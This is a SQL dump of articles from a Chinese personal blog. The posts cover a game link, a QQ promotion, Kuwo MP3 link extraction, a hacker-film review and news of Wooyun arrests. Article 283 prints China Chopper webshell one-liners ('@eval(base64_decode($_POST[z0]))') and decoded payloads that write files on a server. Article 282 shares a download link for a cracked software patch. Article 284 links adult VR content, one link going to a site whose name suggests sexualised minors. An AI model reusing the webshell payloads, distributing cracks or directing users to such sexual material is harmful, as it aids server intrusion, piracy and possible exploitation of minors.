INSERT INTO `blog_article` VALUES ('277', '分享一款让你砸键盘的小游戏能不看攻略通关算6', '<p><a href=\"http://pan.baidu.com/s/1dEPIyhb\" target=\"_blank\"><strong><span style=\"font-size: 18px;\">http://pan.baidu.com/s/1dEPIyhb</span></strong></a><br></p>', 'https://feilongwl.cn/Public/Uploads/2017-02-03/58948c0b359b8.png', '1', '32', '1498030841', '1498030841', '1145', '0', '', '0', '0', '', '', '', '1');
INSERT INTO `blog_article` VALUES ('278', '超级会员福利再出发10元开通1一个月超级会员+QQ红钻 升级超级会员送QQ红钻', '<p>之前有个活动是20Q币开通超级会员送红钻，活动升级了，现在10Q币升级超级会员可以获得1个月的超级会员+一个月的QQ红钻</p><p>&nbsp;</p><p>手机QQ扫码进入活动页面，点击续费超级会员，可以看到有个升级超级会员！只需要10元!</p><p>&nbsp;</p><p>如果你普通会员到期时间与超级会员到期时间 间隔不超过31天 就没有升级选项</p><p>&nbsp;</p><p>手机QQ扫码进入：</p><p>&nbsp;</p><p><img alt=\"超级会员福利再出发10元开通1一个月超级会员+QQ红钻_升级超级会员送QQ红钻\" src=\"http://www.qzone520.com/upFiles/infoImg/coll/20160802/OT20160802135601241.png\"></img></p>', 'https://feilongwl.cn/Public/Uploads/2017-02-03/58948c986ddcf.png', '1', '24', '1498030886', '1498030886', '1385', '0', '', '0', '0', '', '', '', '1');
INSERT INTO `blog_article` VALUES ('279', '提取酷我音乐MP3外链地址', '<p>右键点击搜索结果的歌曲名字然后点击复制链接地址</p><p><img src=\"http://www.kmiwz.com/content/uploadfile/201602/51b01454998168.jpg\" alt=\"a7769a37fa307c7f146c74252a85b46520150125042319.jpg\" width=\"305\" height=\"343\"></p><p>这就是复制的歌曲链接地址<a href=\"http://www.kuwo.cn/yinyue/1650214/\">http://www.kuwo.cn/yinyue/1650214/</a></p><p>链接中的1650214就是这首歌曲的ID，我们复制歌曲的ID。</p><p>然后就用到这段URL：<a href=\"http://player.kuwo.cn/webmusic/st/getNewMuiseByRid?rid=MUSIC_\">http://player.kuwo.cn/webmusic/st/getNewMuiseByRid?rid=MUSIC_</a></p><p>把复制的歌曲ID添加到这段URL后面，效果如下：</p><p><a href=\"http://player.kuwo.cn/webmusic/st/getNewMuiseByRid?rid=MUSIC_1650214\">http://player.kuwo.cn/webmusic/st/getNewMuiseByRid?rid=MUSIC_1650214</a></p><p>在浏览器中打开上面这个URL，会发现都是代码，找到代码最下面几行（如下图）。</p><p><img src=\"http://www.kmiwz.com/content/uploadfile/201602/44771454998168.jpg\" alt=\"68c18bfe61392440b7793d6c16641d5720150125042321.jpg\" width=\"335\" height=\"176\"></p><p>用蓝色圈出来的是MP3外链的头部，红色的是MP3外链的尾部，在头部和尾部中间加一个/resource/，在MP3外链前面添加http://</p><p>MP3外链地址：http://<span style=\"color: rgb(51, 127, 229);\">ra01.sycdn.kuwo.cn</span>/resource/<span style=\"color: rgb(229, 51, 51);\">n3/32/56/3260586875.mp3</span></p>', 'https://feilongwl.cn/Public/Uploads/2017-02-03/58948ca1ca143.jpg', '1', '22', '1498031056', '1498031056', '1118', '0', '', '0', '0', '', '', '', '1');
INSERT INTO `blog_article` VALUES ('280', '社工类黑客电影《我是谁：没有绝对安全的系统》', '<p>这是飞龙最喜欢的一部黑客素材电影。很多人并不认为这部电影有什么好看的，剧情也比较老套。可对于社工迷来说，在最后剧情把观众也包含在内的社工学攻击简直完美。</p><p>剧情简介</p><p>本杰明是一个这样的人：智商165，但是在现实世界中，他是一个失败者，并且常常为找不到存在感而忧伤。</p><p>他没有女朋友，唯一喜欢的女孩虽然是同学，但是由于他的性格怪癖所以常年坐在教室的后面，导致女孩不认识他。</p><p>但是二十五岁的他却是一个电脑黑客，拥有对C/C++等多种编程语言以及在黑客死亡IP追踪上拥有不可思议的天赋，他可以追踪到任何一个人的任何信息。而影片中另一位主人公马克思是一个渴望“黑客世界”的潜在革命者，他注意到了本杰明在网络方面神一般的操控能力。</p><p>他们组建了黑客组织CLAY，这意味小丑的嘲笑，并且为了炫耀而入侵国际安全系统/国际金融系统/国际金融评估系统/德国安全局/德国情报局。而在这期间他认识了他最开始喜欢的女孩，开始交往。</p><p>他们凭借高超的黑客技术引起了德国特种警察组织、欧洲特种刑警组织的重视，并且一个智商170的代号为\"MRX\"的黑客首脑将他们视作威胁，而最终头目俄罗斯的\"血族\"网络黑帮想要将他们除去甚至派出了2个杀手。</p><p>本杰明因此感觉到自己正在面临生死攸关的考验，并且他们的目标似乎不值得他付出如此大的代价。</p><p>但真正可怕的是好像他从来没有过女朋友，CLAY根本没有什麼队友......一切的一切好像全都是幻想的，可是血族的可怕吸血鬼继续在追杀着自己，好像又都发生过一样。[1]</p><p>四人小组CLAY分别是:</p><p>马克思 智商极高，拥有高级的组织能力和任务分配能力，但放浪的性格耽误了他与成员之间的信任。</p><p>本杰明 智商极高，拥有改写一切计算机程序和入侵一切防火墙的能力，在他面前，没有任何组织和个人的隐私。</p><p>斯蒂芬 智商极高 拥有在任何系统发现漏洞的能力 但是精神不正常 喜欢刺激的事物。</p><p>保罗 智商极高，曾经在30秒内用一个曲别针以及一块电路板改装了硬盘，成功入侵了皇室的电脑。</p><p>社会工程学</p><p>说道社会工程学就不得不提到顶级黑客凯文.米特尼克写的《欺骗的艺术》，讲诉是利用高超的电脑技术展示完美的欺骗式入侵</p>', 'https://feilongwl.cn/Public/Uploads/2017-02-03/58948d87f037d.jpg', '1', '33', '1498031151', '1498031151', '2328', '0', '', '0', '0', '', '', '', '1');
INSERT INTO `blog_article` VALUES ('281', '乌云网多名高管被带走 白帽社区边界问题引关注', '<p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">针对近日网上流传“白帽社区平台乌云网多名高管被捕”一事。财新记者从多个渠道确认，乌云网近十多名团队成员被警方带走，包括乌云网创始人方小顿。目前，各方尚不清楚乌云网因何出事。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">“事情发生得很突然，乌云网的人自己也不知道出了什么事。”一位接近乌云网的知情人士告诉财新记者，“大概一个礼拜前，是下午，乌云网近十多名团队成员被警方带走。乌云网的人说，当时没有什么手续，也没有通知。”</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">上述知情人士向财新记者透露，乌云网创始人方小顿当天被带走。财新记者多次联系方小顿，未获回复。方小顿的微信朋友圈早已于7月18日停止更新。他在最后一条朋友圈里称，“比天赋更重要的是变强起来的勇气，希望回来能有更好的自己。”当时的他还在朋友圈里推荐乌云的一款产品“唐朝安全巡航”，并配上大笑的表情。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">7月8日-9日，方小顿曾在2016年乌云白帽大会上公开露面。当时，他与中科院软件研究所研究员丁丽萍、公安部网络安全专家童瀛等业内知名人士一起探讨系统漏洞披露模式的边界问题。与会人士介绍，当天的方小顿看不出有何异样，情绪也很稳定。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">另一位与乌云有合作往来的人士称，当时带走的人里面没有乌云市场负责人邬迪。财新记者试图联系邬迪，但他的电话已处于呼叫转移状态。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">7月19日，乌云网已经无法登陆。7月20日凌晨，乌云发布了一则升级公告，称为了更好地向用户提供服务，乌云及相关服务将进行升级。在这则公告里，乌云还称，“我们将在最短的时间内，以最好的姿态回归。”但直至7月28日，乌云仍处宕机状态。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">上述与乌云有合作往来的人士向财新记者透露，乌云网并非相关部门封掉了，而是乌云自己的人决定停掉，估计是规避风险。“8月上旬，成都将召开一个有关网络安全的大会，本来是邀请了乌云的人做演讲。现在也取消了。”一位接近乌云的人士称。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">一位多年活跃在乌云平台上的白帽对财新记者表示，真实的情况到底是什么很难知道。关心乌云的人基本都在默默地等着，希望乌云赶紧恢复。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">事出原因不明引猜测</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">乌云网出事消息传出后，白帽们及互联网圈内人士纷纷猜测其出事原因。大体有三种说法：一是杭州IT人士袁炜在乌云平台提交了世纪佳缘网站系统漏洞，世纪佳缘按照惯例修复漏洞并致谢乌云网之后，突然以“网站数据被非法窃取”为由报警。之后北京朝阳区人民检察院于2016年4月批捕袁炜。检方已决定对袁炜提起公诉，乌云可能受到牵连。二是乌云平台上的白帽测试了相关政府部门的网络系统，乌云受到牵连。三是7月全国多名艾滋病患者信息被泄漏，乌云因在平台上公布过中疾控疫情网存在系统漏洞受调查。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">中国互联网协会信用评价中心法律顾问赵占领分析，乌云网受世纪佳缘事件影响的可能性不太大。按照相关法律，技术人士利用漏洞机会实施犯罪行为，比如获取数据、破坏系统等。这些行为本身不是在平台上发生的，而是发生在平台之外的行为。平台做的只是将漏洞通过图片、文字等形式公布出来，平台的行为也可能是法律问题，但不是犯罪问题。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">“平台涉及的法律问题可能包括白帽发布漏洞不实或不准确，平台因对漏洞信息负有审核责任，造成共同侵权。”赵占领认为。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">“白帽”社区边界在哪里？</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">乌云网的定位是一个位于厂商和安全研究者之间“自由平等”的漏洞报告平台，由原百度“80后”高级安全工程师方小顿联合几位同行创办，2010年5月正式上线，核心的运营思路遵循开放和分享的原则。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">短短6年间，乌云被业内誉为中国最大的白帽聚集地，2014年大概有近5000名白帽活跃在乌云网上。按照互联网圈普遍定义，白帽是指拥有高超的互联网技术，能够发现网络漏洞或风险点，但并不以此作恶的人。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">“白帽发现漏洞，乌云审核通过，会提供给相关公司让其认领并修复。只有在相关公司不认领的情况下，乌云才会在平台上向公众予以公开。”上述多年活跃在乌云平台上的白帽向财新记者介绍，“报告漏洞都是免费的，乌云并不向企业收费，是非营利性的机构。”</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">按照乌云的流程，一般10天向核心白帽子公开其漏洞细节，20天向普通白帽子公开，30天向实习白帽子公开。直到45天之后，企业仍未主动认领漏洞，则会向公众公开其细节。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">一位熟悉乌云运作模式的人士称，从商业盈利的角度，乌云现在也会接受商业公司的委托进行安全测试，譬如乌云的一些产品唐朝安全巡航、安全众测等。但这与白帽主动在乌云平台报告漏洞是完全分开的。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">白帽在未经公司允许的情况下是否能主动去测试其系统安全？按照相关法律，测试系统漏洞的行为不违法，就像你去敲敲门发现别人的门没锁立刻告诉别人，是善意提醒。但是，如果发现别人门没锁，进去别人家里则另当别论。</span></p><p><span style=\"color: rgb(0, 0, 0); font-size: 18px;\">赵占领认为，涉及白帽的犯罪行为主要有三种：一是非法侵入计算机系统罪，但该犯罪行为指的是被入侵对象必须是国家事务或国防系统。一般情况下，如果不是政府网站的话，白帽一般不会涉及；二是非法获取计算机信息数据罪，这个罪名成立需要有三个条件：必须要有入侵或者通过其他方法获取数据，而且情节严重。“情节严重”包括金融机构的金融身份认证信息达到十组以上，其他的身份认证信息达到500组以上，或者是非法控制计算机系统等具体条件；三是操纵、破坏计算机信息系统罪，包括控增加、删除、修改、干扰计算机系统，或者是对数据有相应的删除行为，甚至倒卖数据等。</span></p>', 'https://feilongwl.cn/Public/Uploads/2017-02-03/58948d928bdef.png', '1', '34', '1498031201', '1498031201', '1069', '0', '', '0', '0', '', '', '', '1');
INSERT INTO `blog_article` VALUES ('282', '易语言5.5破解补丁分享亲测可用', '<p><span style=\"font-size: 14px;\">软件仅适用于 易语言 5.5 ，官方下载地址&nbsp;</span><a target=\"_blank\" href=\"http://www.dywt.com.cn/pdown.htm\">http://www.dywt.com.cn/pdown.htm</a><br><br><br></p><p>百度云盘下载地址：</p><p><a target=\"_blank\" href=\"http://pan.baidu.com/s/1pLrhLKf\">百度云盘</a></p><p><a href=\"http://pan.baidu.com/s/1pLrhLKf\">http://pan.baidu.com/s/1pLrhLKf</a></p>', 'https://feilongwl.cn/Public/Uploads/2017-02-03/58948dbea6036.png', '1', '25', '1498031262', '1498031262', '949', '0', '', '0', '0', '', '', '', '1');
INSERT INTO `blog_article` VALUES ('283', '中国菜刀通讯加密分析', '<p>今天在土司看到有人说菜刀有后门，正好我前段时间对菜刀一句话通讯做过分析，借此发篇文章献丑了。 说明：菜刀用post与服务端通讯，各种语言的加密方法都一样的，仅执行代码不同，这里仅以PHP为例。<br>其实菜刀的通讯加密并不是很复杂，仅用到base64_encode()函数，但是它的加密手法非常巧妙。 一般POST到服务器的数据，就算加密过了，我们也能用echo $_POST[‘pass’]的方法得到加密后的数据， 所以我分析时在服务器上的”一句话”后面加了段代码，让所有$_POST[‘pass’]的内容都各自保存到一个txt文本。 但用菜刀执行一些操作后，发现服务端保存的txt文本里都只有一句代码：”@eval(base64_decode($_POST[z0]));”。<br>这是它的加密手法之一：<strong>POST里包含POST</strong>，这样即使管理员发现一句话木马，也无法截取到你执行了什么代码。 服务端突破基本无望，只能本地抓包了，下面这段代码是用抓包工具抓到新建文件的POST数据。(pass是一句话里的post变量名)</p><p>Code</p><p>&nbsp;</p><blockquote>pass=@eval(base64_decode($_POST[z0]));&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO 0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvIEB md3JpdGUoZm9wZW4oYmFzZTY0X2RlY29kZSgkX1BPU1RbInoxIl0pLCJ3IiksYmFzZTY0X2RlY29kZSgkX1BPU1RbIno yIl0pKT8iMSI6IjAiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=RDpcXFdXV1xcd3d3XFxOZXdGaWxlLnR4dA%3D %3D&amp;z2=dGVzdA%3D%3D&nbsp;&nbsp;<br></blockquote><p>[code/]可以看到不止发送一个POST变量(POST变量用&amp;分割)，而一句话木马的POST执行的是$_POST[z0]，这是第二个POST的变量z0，&nbsp;&nbsp;可以看出z0变量经过base64_encode()加密，所以要先解密z0变量，用base64_decode()函数解密z0得到如下：&nbsp;&nbsp;</p><p>[code]</p><blockquote>@ini_set(“display_errors”,”0″);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-6 �木�� 犮��蝌 � 恚���}A=MQl�t什� 恚���}A=MQl�t中����擨�□�貙�欠 �木�&nbsp;&nbsp;<br></blockquote><p>&nbsp;</p><p>只解密出了前三句代码，后面全是乱码，这里我找了一晚上都没找到问题出在哪，看起来加密代码应该没有问题， 因为前面的pass变量可以看出是直接用base64_decode()解密用eval执行的，如果有经过其他加密处理就没无法执行代码了。</p><p>直到第二天才发现问题所在，这是他的第二个加密手法：<strong>利用服务器接收POST数据时自动将经过url编码处理的字符串还原。</strong>&nbsp;各位仔细看z0变量里的加密代码，会发现有两个%符号，而base64编码是不支持%符号的，带%的一般是url编码。<br>我把%2B和%3D用urldecode()函数还原分别是+号和=号，替换到加密代码里再用base64_decode()解密得到了完整代码：</p><p>&nbsp;</p><p>Code</p><blockquote><br>@ini_set(“display_errors”,”0″); @set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-&gt;|”);; echo @fwrite(fopen(base64_decode($_POST[“z1″]),”w”),base64_decode($_POST[“z2″]))?”1″:”0″;; echo(“|&lt;-“);die();&nbsp;&nbsp;<br><br></blockquote><p>而在这段代码又包含了两个POST变量，$_POST[‘z1′]和$_POST[‘z2′]，这是第三层POST包含了，且也经过base64加密和url编码。<br>从先前抓的数据包找到这两个变量，先还原里面的url编码字符，再用base64_decode()解密，得到如下 z1=D:\\WWW\\www\\NewFile.txt //新建文件保存路径 z2=test //新建文件内容 到这里我们才算真正将$_POST[‘pass’]里的代码完全还原出来了。</p><p>&nbsp;</p><p>Code</p><blockquote><br>@ini_set(“display_errors”,”0″); @set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-&gt;|”);; echo @fwrite(fopen(“D:\\WWW\\www\\NewFile.txt”,”w”),”test”)?”1″:”0″;; echo(“|&lt;-“);die();&nbsp;&nbsp;<br><br></blockquote><p>eval执行的就是上面的代码。<br>其他如编辑，复制等操作也是一样的加密手法，我已经将他们全部还原成明文，并没有发现所谓的后门， 对菜刀客户端也进行了两个多小时的抓包监听，也无任何自动执行动作 .</p>', 'https://feilongwl.cn/Public/Uploads/2017-02-03/589486d330e66.jpg', '1', '3', '1498031286', '1498031286', '1524', '0', '', '0', '0', '', '', '', '1');
INSERT INTO `blog_article` VALUES ('284', 'VR你懂得资源第一人称含多部种子分享', '<p>博主给友友发福利了 ！！！</p><p>VR眼镜都买过了吧 本身价格低 比较新鲜</p><p>空有眼镜 没资源多苦</p><p>国外那种网站想看宅N资源还需要付费&nbsp;</p><p>为了方便大家 就拿来分享了&nbsp;</p><p>萝莉云播：<a href=\"http://www.loliyun.com/\" target=\"_blank\">http://www.loliyun.com/</a></p><p>你懂得 资源 &nbsp;</p><p><img src=\"http://feilongwl.cn/Public/umeditor/php/upload/20160519/14636253689548.jpg\"></p><p>资源下载地址：<a href=\"http://pan.baidu.com/s/1c2DfxdA\" target=\"_blank\">&nbsp;http://pan.baidu.com/s/1c2DfxdA</a>&nbsp;密码: x43i</p>', 'https://feilongwl.cn/Public/Uploads/2017-02-03/589486541aa77.png', '1', '40', '1498031328', '1498031328', '2699', '1', '', '0', '0', '', '', '', '1');
